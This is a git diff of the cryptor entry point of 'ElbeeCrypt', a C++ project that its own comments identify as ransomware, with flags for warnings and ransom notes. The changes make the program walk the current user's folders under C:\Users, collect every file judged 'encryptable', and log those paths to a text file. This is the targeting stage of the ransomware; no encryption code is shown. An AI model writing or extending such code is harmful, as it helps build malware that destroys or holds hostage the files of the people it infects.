@@ -1,4 +1,5 @@
 #include <filesystem>
+#include <fstream>
 #include <iostream>
 #include <string>
 #include <vector>
@@ -25,8 +26,16 @@
 #define SAFETY_NET true //Whether there should be a warning before running
 #define SPAM_RANSOM_NOTES false //Whether there should be ransom notes dropped in every directory that the ransomware hit
 
+namespace fs = std::filesystem;
 using namespace elbeecrypt;
 using namespace std;
+
+void writeTo(fs::path path, std::string content){
+	std::ofstream file;
+	file.open(path, std::ios_base::app);
+	file << content << "\n";
+	file.close();
+}
 
 /** 
  * Main entrypoint for ElbeeCrypt's cryptor binary. 
@@ -45,9 +54,12 @@ int main(int argc, char **argv){
 
 	std::cout << "Sodium: " << sodium_init() << std::endl;
 
+	vector<fs::path> paths = {};
+
 	//Define the lambda to collect the directory listings
-	auto fileConsumer = [](const fs::path& path){
+	auto fileConsumer = [&paths](const fs::path& path){
 		if(common::targets::Extensions::isEncryptable(path)){
+			paths.push_back(path);
 			std::cout << "Found encryptable file at " << path << std::endl;
 		}
 	};
@@ -63,19 +75,10 @@ int main(int argc, char **argv){
 	std::string uname(getenv("username"));
 	common::io::DirentWalk::walk(fs::path("C:\\Users\\" + uname), fileConsumer, folderConsumer);
 
-	/*
-	vector<fs::path> paths = {};
-
-	common::io::DirentWalk::directoryList("C:\\Users\\", paths);
-
-	cout << paths[0] << endl;
 
 	for(fs::path path : paths){
-		if(common::targets::Extensions::isEncryptable(path)){
-			std::cout << "Found encryptable file at " << path << std::endl;
-		}
+		writeTo(common::io::DirentWalk::pwd() / "test-paths.txt", path.string());
 	}
-	*/
 
 	std::cout << ":)" << std::endl;
 }
